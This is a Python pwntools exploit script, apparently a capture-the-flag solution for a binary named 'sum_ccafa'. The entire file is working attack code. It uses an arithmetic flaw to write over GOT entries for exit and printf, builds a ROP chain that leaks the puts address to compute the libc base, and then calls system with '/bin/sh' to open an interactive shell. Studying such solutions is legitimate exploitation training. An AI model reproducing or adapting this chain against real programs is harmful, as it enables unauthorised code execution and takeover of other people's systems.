from pwn import *

gdbcmds = '''
b *main+149
b *main+154
c
'''
#target = gdb.debug('./sum_ccafa', gdbscript=gdbcmds)
target = process('./sum_ccafa')
elf = context.binary = ELF('sum_ccafa')
libc = elf.libc

popRdi = 0x0000000000400a43
ret = 0x00000000004005ee
randPop = 0x0000000000400a42

def write(addr, val):
    target.sendline(str(0x7fffffffffffffff).encode())
    target.sendline(str(0x7fffffffffffffff - addr).encode())
    target.sendline(b"1")
    target.sendline(b"1")
    target.sendline(str(val).encode())
    target.sendline(str(addr).encode())

target.recvuntil(b"[Example]\n2 3 4 0\n")
write(elf.got['exit'], elf.symbols['main'])

target.recvuntil(b"[Example]\n2 3 4 0\n")
write(elf.got['printf'], randPop)

target.sendline(str(popRdi).encode())
target.sendline(str(elf.got['puts']).encode())
target.sendline(str(elf.plt['puts']).encode())
target.sendline(str(0x004009a7).encode()) 
target.sendline(b"0")

target.recvuntil(b"[Example]\n2 3 4 0\n")
puts = target.recvline().strip()
puts = u64(puts + b"\x00"*(8 - len(puts)))
libc.address  = puts - libc.sym.puts
print("Leak: ", hex(libc.address))

target.sendline(str(popRdi).encode())
target.sendline( str(next(libc.search(b"/bin/sh"))).encode()  )
target.sendline( str(libc.sym.system).encode() )
target.sendline(b"0")

target.interactive()
